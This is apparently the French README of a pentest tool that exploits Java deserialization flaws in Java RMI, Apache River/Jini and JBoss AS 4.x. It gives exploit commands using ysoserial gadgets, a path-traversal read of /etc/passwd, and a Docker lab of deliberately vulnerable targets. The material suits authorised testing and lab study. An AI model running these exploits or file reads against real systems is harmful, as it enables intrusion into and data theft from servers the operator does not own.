# JavaPwner

Outil de pentest Python pour les protocoles Java middleware vulnérables.

**Protocoles couverts :** Java RMI · Apache River / Jini · JBoss AS 4.x

---

## Prérequis

- Python 3.10+
- Java JDK (`java` + `javac` dans le PATH) — pour la génération de payloads
- [ysoserial-all.jar](https://github.com/frohoff/ysoserial/releases) placé dans `lib/ysoserial.jar`

---

## Installation

```bash
python -m venv .venv && source .venv/bin/activate
pip install -e .
```

Vérifier :

```bash
javapwner --help
```

---

## Utilisation rapide

### Java RMI

```bash
# Scanner un endpoint RMI (ports courants auto-détectés si -p omis)
javapwner rmi scan -t 10.0.0.5
javapwner rmi scan -t 10.0.0.5 -p 1099

# Exploiter (auto-détection du gadget si --gadget omis)
javapwner rmi exploit -t 10.0.0.5 -p 1099 --cmd 'id'
javapwner rmi exploit -t 10.0.0.5 -p 1099 --gadget CommonsCollections6 --cmd 'id'

# Scanner plusieurs ports en parallèle
javapwner rmi discover -t 10.0.0.5
```

### Apache River / Jini

```bash
# Scanner le Lookup Service (port 4160 = Unicast Discovery)
javapwner jini scan -t 10.0.0.5 -p 4160

# Exploiter via le port JRMP du Registrar (typiquement 4162)
javapwner jini exploit -t 10.0.0.5 -p 4162 --gadget CommonsCollections6 --cmd 'id'

# Lecture de fichier via path traversal codebase
javapwner jini read-file -t 10.0.0.5 -p 4160 --path /etc/passwd

# Découverte multicast (LAN)
javapwner jini multicast --wait 3
```

### JBoss AS 4.x

```bash
# Scanner et fingerprinter (port 8080)
javapwner jboss scan -t 10.0.0.5 -p 8080

# Exploiter via HTTP Invoker (CVE-2015-7501 / CVE-2017-7504)
javapwner jboss exploit -t 10.0.0.5 -p 8080 --gadget CommonsCollections6 --cmd 'id'

# Scanner le canal JNP (JBoss JNDI/RMI, port 4444 / 1099)
javapwner jboss jnp-scan -t 10.0.0.5
javapwner jboss jnp-exploit -t 10.0.0.5 --gadget CommonsCollections6 --cmd 'id'
```

---

## Options globales

| Flag | Description |
|------|-------------|
| `--verbose` | Affichage détaillé (hex dumps, timings) |
| `--json` | Sortie JSON (pour scripting / pipelines) |
| `--timeout N` | Timeout réseau en secondes (défaut : 5) |
| `--ysoserial <path>` | Chemin vers ysoserial.jar (ou `YSOSERIAL_PATH` env) |

---

## Lab vulnérable local

Un environnement Docker est fourni dans `lab/` pour tester en local.

```bash
cd lab/
docker compose up -d --build
docker compose logs -f         # attendre que tous les services soient prêts
```

Services disponibles après démarrage :

| Target | Port | Scénario |
|--------|------|---------|
| `rmi-java8` | 1099 | Java 8 LTS — JEP290 bypassé par réflexion |
| `rmi-java8-pre-jep290` | 1499 | Java 8u111 — aucun filtre (pre-JEP290) |
| `rmi-java8-jep290-configurable` | 1599 | Java 8u202 — filtre ouvert par propriété système |
| `rmi-java11` | 1199 | Java 11 LTS — bypass Unsafe |
| `rmi-java17` | 1299 | Java 17 LTS — bypass Unsafe |
| `rmi-java21` | 1399 | Java 21 LTS — bypass Unsafe |
| `jini-reggie` | 4160 / 4162 | Apache River 2.2.3 |
| `jboss4` | 8080 / 4444 | JBoss AS 4.2.3.GA |

Voir `lab/README.md` pour les commandes d'exploitation complètes.

---

## JVM Bridge (Tier 2 Jini)

Le Tier 2 Jini nécessite un JDK installé (les JARs Apache River sont déjà dans `lib/`) :

```bash
sudo apt install -y default-jdk    # Kali / Debian
javapwner jini scan -t 10.0.0.5 --tier2
javapwner jini admin -t 10.0.0.5
```

---

## Tests

```bash
# Tests unitaires
.venv/bin/pytest tests/ --ignore=tests/integration -q

# Tests d'intégration (nécessite un Reggie actif)
JINI_TARGET_HOST=127.0.0.1 .venv/bin/pytest tests/integration/ -m live
```
